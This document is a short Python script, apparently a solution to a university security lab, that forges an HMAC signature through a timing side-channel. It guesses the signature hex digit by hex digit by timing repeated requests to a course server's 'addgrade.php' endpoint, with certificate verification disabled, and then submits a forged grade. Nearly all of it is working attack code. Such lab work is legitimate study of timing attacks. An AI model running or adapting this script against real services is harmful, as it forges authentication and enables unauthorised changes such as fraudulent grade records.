##########################################################################
# A web attack utilizing the time delay of a char comparison function    #
##########################################################################

import time as t
import hmac
import requests
from hashlib import sha1
from random import randint

req = requests.packages.urllib3.disable_warnings()

name = 'Kalle'
grade = '5'
result = '0'

possible_val = ['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f']


correct_digit = ''
current_signature = ''
max_time = 0
time = 0
signature = ''

while(len(signature) < 20):
    for val in possible_val:
        current_signature = signature + val

        payload = {'name' : name, 'grade' : grade, 'signature' : current_signature}

        for i in range(10):
            start = t.time()
            req = requests.get("https://eitn41.eit.lth.se:3119/ha4/addgrade.php?", verify=False, params=payload)
            roundtrip = t.time() - start
            time += roundtrip
            #time += req.elapsed.total_seconds()

        time /= 10
        if(time > max_time):
            correct_digit = val
            max_time = time

    signature += correct_digit
    max_time = 0
    time = 0
    print("Current signature:", signature)


payload = {'name' : name, 'grade' : grade, 'signature' : signature}
req = requests.get("https://eitn41.eit.lth.se:3119/ha4/addgrade.php?", verify=False, params=payload)

cont = req.content.decode('utf-8')
result = cont.strip('\n')

print("Response from server:", result)

if(result == '1'):
    print("Valid signature")
else:
    print("Invalid signature")
